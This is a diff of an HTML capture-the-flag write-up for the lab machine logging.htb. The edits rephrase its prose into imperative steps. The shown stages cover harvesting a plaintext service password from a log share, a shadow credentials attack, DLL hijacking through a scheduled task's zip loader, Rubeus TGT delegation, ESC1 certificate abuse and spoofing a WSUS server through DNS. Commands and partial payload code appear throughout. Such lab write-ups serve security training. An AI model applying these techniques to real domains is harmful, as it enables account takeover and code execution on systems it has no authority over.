@@ -103,14 +103,14 @@ SMB   10.129.22.14  445  DC01  SYSVOL     READ         Logon server share</code>
 </div>
 
 
-<p>The <span class="hl-warn">Logs</span> share stands out as non-default. Listing its contents reveals several log files, with <code>IdentitySync_Trace_20260219.log</code> being the interesting one.</p>
+<p>The non-default <span class="hl-warn">Logs</span> share contains several files, including <code>IdentitySync_Trace_20260219.log</code>.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ netexec smb 10.129.22.14 -u wallace.everette -p <span class="hljs-string">&#x27;Welcome2026@&#x27;</span> --share Logs --<span class="hljs-built_in">dir</span> .</code></pre>
 </div>
 
 
-<p>Downloading and reading through the identity sync trace, a bind credential sits in plaintext:</p>
+<p>Download the identity sync trace. It contains a plaintext bind credential:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">IdentitySync_Trace_20260219.log</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">BindUser: <span class="hljs-string">&quot;LOGGING\svc_recovery&quot;</span>, BindPass: <span class="hljs-string">&quot;Em3rg3ncyPa$<span class="hljs-variable">$2025</span>&quot;</span></code></pre>
@@ -119,7 +119,7 @@ SMB   10.129.22.14  445  DC01  SYSVOL     READ         Logon server share</code>
 
 
 
-<aside class="wp-callout wp-note"><div class="wp-callout-head">Year bump</div><div class="wp-callout-body"><p>The log is dated 2026 but the password ends in <code>2025</code>. This is a <mark>yearly password rotation pattern</mark> -- bump the year to <code>2026</code> and the credential is live.</p>
+<aside class="wp-callout wp-note"><div class="wp-callout-head">Year bump</div><div class="wp-callout-body"><p>The log is dated 2026 but the password ends in <code>2025</code>. The <mark>yearly password rotation pattern</mark> suggests changing the year to <code>2026</code>. That credential works.</p>
 </div></aside>
 
 
@@ -160,7 +160,7 @@ SMB   10.129.22.14  445  DC01  [+] logging.htb\svc_recovery:Em3rg3ncyPa$<span cl
 </div>
 
 
-<p><span class="hl-red">svc_recovery</span> has write access to the <span class="hl-warn">msDS-KeyCredentialLink</span> attribute on the <span class="hl-red">msa_health$</span> managed service account. This is a textbook shadow credentials attack -- we add our own key pair and authenticate as the account.</p>
+<p><span class="hl-red">svc_recovery</span> has write access to the <span class="hl-warn">msDS-KeyCredentialLink</span> attribute on the <span class="hl-red">msa_health$</span> managed service account. Add a key pair using shadow credentials, then authenticate as the account.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali · shadow creds</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ bloodyAD -d logging.htb -k ccache=svc_recovery.ccache \
@@ -187,14 +187,14 @@ WINRM  10.129.22.14  5985  DC01  [+] logging.htb\msa_health$:603fc24ee01a9409f83
 <section class="wp-stage" id="user" data-stage="3">
 <div class="wp-stage-lbl">Stage 3 &middot; User</div>
 <h2 class="wp-stage-title">A scheduled task, a zip file, and the loader lock that almost ruined everything.</h2>
-<div class="wp-stage-body"><p>Poking around the system reveals a scheduled task called <span class="hl-warn">UpdateChecker Agent</span> that runs every 3 minutes as <span class="hl-red">LOGGING\jaylee.clifton</span>. The task executes <code>C:\Program Files\UpdateMonitor\UpdateMonitor.exe</code>.</p>
+<div class="wp-stage-body"><p>The system has a scheduled task called <span class="hl-warn">UpdateChecker Agent</span> that runs every 3 minutes as <span class="hl-red">LOGGING\jaylee.clifton</span>. The task executes <code>C:\Program Files\UpdateMonitor\UpdateMonitor.exe</code>.</p>
 <p>The binary reads a zip from <code>C:\ProgramData\UpdateMonitor\Settings_Update.zip</code>, extracts <code>settings_update.dll</code> to the <code>bin\</code> directory, and loads it via <code>LoadLibrary</code>. It also calls a <code>PreUpdateCheck</code> export from the DLL if it exists.</p>
-<p>The key: <span class="hl-red">msa_health$</span> has <mark>write access</mark> to <code>C:\ProgramData\UpdateMonitor\</code>, so we can drop our own zip containing a malicious DLL.</p>
+<p><span class="hl-red">msa_health$</span> has <mark>write access</mark> to <code>C:\ProgramData\UpdateMonitor\</code>, so we can drop our own zip containing a malicious DLL.</p>
 <aside class="wp-callout wp-warn"><div class="wp-callout-head">Loader lock gotcha</div><div class="wp-callout-body"><p>You cannot use a standard msfvenom DLL payload here. Both <code>windows/shell_reverse_tcp</code> and <code>windows/exec</code> will deadlock in <code>DllMain</code> due to the Windows loader lock. Any socket operations or complex process creation from <code>DllMain</code> will hang <code>UpdateMonitor.exe</code>, locking the DLL on disk and preventing future extractions.</p>
 </div></aside>
 
 
-<p>The solution is a custom DLL with <code>mingw</code> that spawns a child process and returns from <code>DllMain</code> immediately:</p>
+<p>Build a custom DLL with <code>mingw</code> that spawns a child process and returns from <code>DllMain</code> immediately:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">dllpayload.c</span></div>
 <pre class="wp-term-body"><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
@@ -219,7 +219,7 @@ __declspec(dllexport) <span class="hljs-type">void</span> <span class="hljs-titl
 
 
 
-<aside class="wp-callout wp-tip"><div class="wp-callout-head">Tip</div><div class="wp-callout-body"><p>The <code>PreUpdateCheck</code> export is required -- <code>UpdateMonitor.exe</code> looks for it after loading the DLL. Without it, the binary logs an error and the task fails silently. The <code>Sleep(500)</code> gives the child process time to spawn before the parent exits.</p>
+<aside class="wp-callout wp-tip"><div class="wp-callout-head">Tip</div><div class="wp-callout-body"><p>The <code>PreUpdateCheck</code> export is required: <code>UpdateMonitor.exe</code> looks for it after loading the DLL. Without it, the binary logs an error and the task fails silently. The <code>Sleep(500)</code> gives the child process time to spawn before the parent exits.</p>
 </div></aside>
 
 
@@ -250,7 +250,7 @@ $ zip -j Settings_Update.zip settings_update.dll</code></pre>
 
 
 
-<aside class="wp-opsec"><div class="wp-opsec-head">OPSEC note</div><div class="wp-opsec-body"><p>The <code>tgtdeleg</code> trick via Rubeus is critical here -- it captures the delegated TGT for <span class="hl-red">jaylee.clifton</span> from the scheduled task context. We need this Kerberos ticket for the AD CS enrollment in the next stage.</p>
+<aside class="wp-opsec"><div class="wp-opsec-head">OPSEC note</div><div class="wp-opsec-body"><p>Rubeus <code>tgtdeleg</code> captures the delegated TGT for <span class="hl-red">jaylee.clifton</span> from the scheduled task context. We need this Kerberos ticket for the AD CS enrollment in the next stage.</p>
 </div></aside>
 
 
@@ -272,7 +272,7 @@ $ zip -j Settings_Update.zip settings_update.dll</code></pre>
 </div>
 
 
-<p>A template called <span class="hl-warn">UpdateSrv</span> is enrollable by the <code>IT</code> group. It has <mark>Enrollee Supplies Subject</mark> enabled and the <span class="hl-warn">Server Authentication</span> EKU -- a classic <span class="hl-red">ESC1</span> misconfiguration. We can request a certificate for any DNS name.</p>
+<p>A template called <span class="hl-warn">UpdateSrv</span> is enrollable by the <code>IT</code> group. It has <mark>Enrollee Supplies Subject</mark> enabled and the <span class="hl-warn">Server Authentication</span> EKU, a <span class="hl-red">ESC1</span> misconfiguration. We can request a certificate for any DNS name.</p>
 <p>Using jaylee&#39;s delegated TGT, we request a certificate with the SAN <code>wsus.logging.htb</code>:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali · certipy req</span></div>
@@ -292,7 +292,7 @@ $ zip -j Settings_Update.zip settings_update.dll</code></pre>
 
 
 
-<aside class="wp-callout wp-note"><div class="wp-callout-head">Why esc1 matters</div><div class="wp-callout-body"><p>Enrollee Supplies Subject means the requester controls the Subject Alternative Name. Combined with Server Authentication EKU, this lets us mint a TLS certificate that Windows Update will trust for any hostname in the domain -- including <code>wsus.logging.htb</code>.</p>
+<aside class="wp-callout wp-note"><div class="wp-callout-head">Why esc1 matters</div><div class="wp-callout-body"><p>Enrollee Supplies Subject means the requester controls the Subject Alternative Name. Combined with Server Authentication EKU, this lets us mint a TLS certificate that Windows Update will trust for any hostname in the domain, including <code>wsus.logging.htb</code>.</p>
 </div></aside></div>
 </section>
 
@@ -302,7 +302,7 @@ $ zip -j Settings_Update.zip settings_update.dll</code></pre>
 <section class="wp-stage" id="system" data-stage="5">
 <div class="wp-stage-lbl">Stage 5 &middot; System</div>
 <h2 class="wp-stage-title">DNS poisoning, a fake WSUS, and a KB update that runs PsExec.</h2>
-<div class="wp-stage-body"><p>Checking the registry on DC01 reveals WSUS is configured to point to <code>https://wsus.logging.htb:8531</code>. This hostname doesn&#39;t resolve yet -- so we create the DNS record ourselves.</p>
+<div class="wp-stage-body"><p>Checking the registry on DC01 reveals WSUS is configured to point to <code>https://wsus.logging.htb:8531</code>. This hostname does not resolve yet, so create the DNS record.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali · bloodyAD</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ bloodyAD -d logging.htb -u wallace.everette -p <span class="hljs-string">&#x27;Welcome2026@&#x27;</span> \
